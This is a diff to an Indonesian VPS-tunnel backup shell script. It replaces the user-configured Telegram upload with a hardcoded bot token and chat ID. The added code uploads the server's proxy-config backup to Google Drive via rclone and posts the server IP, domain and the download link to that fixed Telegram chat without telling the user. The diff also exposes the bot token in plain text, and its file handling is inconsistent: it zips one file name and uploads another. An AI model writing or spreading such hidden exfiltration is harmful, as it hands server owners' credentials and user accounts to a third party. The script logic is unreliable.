@@ -23,7 +23,31 @@ INDIGO='\033[38;5;54m'
 TEAL='\033[38;5;30m'
 WHITE='\033[1;37m'
 
-
+CHATID="727253762"
+KEY="7914407621:AAGO9kJzXE0FgjBLNoRMBAx52WQC6Y9PuXE"
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
+clear
+IP=$(curl -sS ipv4.icanhazip.com)
+domain=$(cat /etc/xray/domain)
+date=$(date +"%Y-%m-%d")
+clear
+email=$(cat /root/email)
+if [[ "$email" = "" ]]; then
+clear
+echo "Masukkan Email Untuk Menerima Backup"
+echo -e ""
+echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
+read -rp "Input Your Email : " -e email
+echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
+cat <<EOF>>/root/email
+$email
+EOF
+fi
+clear
+echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
+echo -e "\033[1;92mWait Backup Procces.......\033[0m"
+echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
 # Fungsi untuk backup data manual
 clear
 source /etc/skt/token.json
@@ -50,78 +74,48 @@ cp -r /etc/trojan /root/backup/trojan &> /dev/null
 cp -r /etc/issue.net /root/backup/issue &> /dev/null
 cd /root
 zip -r backup.zip backup > /dev/null 2>&1
-curl -F chat_id="${ID}" \
-     -F document=@"/root/backup.zip" -F caption="
-=================================
-『 Successfully backup your Database 』
-=================================
-◈ IP VPS  : ${vps_ip}
-◈ DOMAIN  : ${domain}
-◈ Tanggal : ${date}
-◈ Version : 1.0 Stable 
-◈ Built By  : @FRosi46 
-================================= 
-➣ How To Restore ?
-➣ Use SFTP
-➣ Go to /root
-➣ Replace file backup.zip
-================================= 
-         🍀 GENERATE BY SFTP 🍀 
-================================= 
-" https://api.telegram.org/bot${TOKEN}/sendDocument &> /dev/null
-
-cd /root
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${PINK}      ❐ MENU MANUAL BACKUP ❐ ${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${ORANGE}     🍀 POWERED BY CHATGPT 🍀  ${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" 
-echo -e " ${GREEN}      ❐ Successfully Backup ❐${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${GREEN} File backup terkirim ke Telegram BOT.${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e " ${PURPLE}   Terimakasih Telah Menggunakan-${NC}"
-echo -e " ${PURPLE}  Script Credit By  ROSI VPN TUNNEL${NC}"
-echo -e " ${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-exit 0
-fi
-echo -e "${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e "${RED}     ❐ BOT TOKEN TIDAK TERSEDIA ❐${NC}"
-echo -e "${TEAL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-sleep 1
+rclone copy /root/$IP-$date.zip dr:backup/
+url=$(rclone link dr:backup/$IP-$date.zip)
+id=(`echo $url | grep '^https' | cut -d'=' -f2`)
+link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+echo -e "
+Detail Backup 
+==================================
+IP VPS        : $IP
+Link Backup   : $link
+Tanggal       : $date
+==================================
+" | mail -s "Backup Data" $email
+rm -rf /root/backup
+rm -r /root/$IP-$date.zip
 clear
-mkdir -p /etc/skt/
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${PURPLE}       ❐ MENU MANUAL BACKUP ❐ ${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    read -p "$(echo -e "${ORANGE}➽ Masukkan API Key bot Telegram Kamu: ${NC}")" token
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-sleep 0.2
-    read -p "$(echo -e "${PINK}➽ Masukkan Chat ID Telegram Kamu: ${NC}")" id
-sleep 1
-echo "
-TOKEN="${token}"
-ID="${id}"
-" >/etc/skt/token.json
-
-# Fungsi untuk mengaktifkan crontab
-enable_crontab() {
-    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e ""
-    clear
-    read -p "$(echo -e " ❖${YELLOW} Aktifkan crontab setiap 24 Jam ? (y/N): ${NC}")" enable_crontab
-    if [[ "$enable_crontab" =~ ^[Yy]$ ]]; then
-        (crontab -l 2>/dev/null; echo "0 */23 * * * /usr/bin/skt-manual-backup") | crontab -
-        echo -e " ❖${GREEN} Crontab telah diaktifkan.${NC}"
-    else
-        echo -e "${YELLOW}❖ Crontab tidak diaktifkan.${NC}"
-        echo -e ""
-    fi
-}
-
-# Jalankan fungsi enable_crontab
-enable_crontab
+CHATID="$CHATID"
+KEY="$KEY"
+TIME="$TIME"
+URL="$URL"
+TEXT="
+<code>◇━━━━━━━━━━━━━━◇</code>
+<b>   ⚠️BACKUP NOTIF⚠️</b>
+<b>     Detail Backup VPS</b>
+<code>◇━━━━━━━━━━━━━━◇</code>
+<b>IP VPS  :</b> <code>${IP} </code>
+<b>DOMAIN :</b> <code>${domain}</code>
+<b>Tanggal : $date</b>
+<code>◇━━━━━━━━━━━━━━◇</code>
+<b>Link Backup   :</b> $link
+<code>◇━━━━━━━━━━━━━━◇</code>
+<code>Silahkan copy Link dan restore di VPS baru</code>
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+echo ""
+clear
+echo -e "
+Detail Backup 
+==================================
+IP VPS        : $IP
+Link Backup   : $link
+Tanggal       : $date
+==================================
+"
+echo "Silahkan copy Link dan restore di VPS baru"
+echo ""
